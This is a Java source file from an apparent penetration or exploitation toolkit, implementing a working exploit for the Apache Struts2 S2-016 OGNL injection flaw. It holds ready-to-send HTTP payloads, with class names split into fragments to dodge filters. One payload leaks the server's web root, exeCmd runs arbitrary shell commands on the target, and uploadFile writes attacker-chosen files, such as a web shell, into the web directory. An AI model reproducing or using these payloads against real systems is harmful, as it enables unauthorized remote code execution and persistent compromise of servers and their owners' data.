package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/17 13:57
 * @github https://github.com/yhy0
 */

public class S2_016 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;

    private String payload = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27GB2312%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path8888997:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}";

    private String webPath;

    private HashMap<String, String> headers = new HashMap();

    @Override
    public String checkVul(String url) {
        this.target = url;
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, this.payload, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains("webpath8888997")) {
            this.isVul = true;
            this.webPath = response.getText().replace("webpath8888997:", "");
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        String cmd_payload = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27payload%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27encoding%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";

        String data = cmd_payload.replace("payload", cmd).replace("encoding", encoding);

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, data, headers, encoding);
        return Tools.regReplace(response.getText());
    }

    @Override
    public String getWebPath() {
        return this.webPath;
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {

        fileContent = URLEncoder.encode(fileContent, "UTF-8" );

        String payload = "redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22Ok0%22),%23res.getWriter().print(%22Kok%22),%23res.getWriter().flush(),%23res.getWriter().close(),%23p%3d(%23req.getRealPath(%22%2F%22)%2b%22PATH%22).replaceAll(%22\\\\\\\\%22, %22/%22),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=SHELL";

        payload = payload.replace("PATH", filename).replace("SHELL", fileContent);

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, payload, headers, "UTF-8");

        String result = response.getText();

        if(result.contains("Ok0Kok")) {
            result = result + "  上传成功! ";
        } else {
            result =  "上传失败";
        }

        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
